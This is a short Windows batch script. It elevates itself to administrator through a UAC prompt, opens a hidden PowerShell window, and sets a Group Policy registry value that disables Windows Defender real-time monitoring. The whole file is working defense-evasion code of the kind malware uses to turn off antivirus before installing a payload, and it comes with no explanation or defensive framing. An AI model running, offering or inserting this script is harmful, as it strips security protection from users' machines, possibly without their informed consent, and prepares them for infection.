@echo off


if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b) 
cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden "Write-Host"



Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f


exit
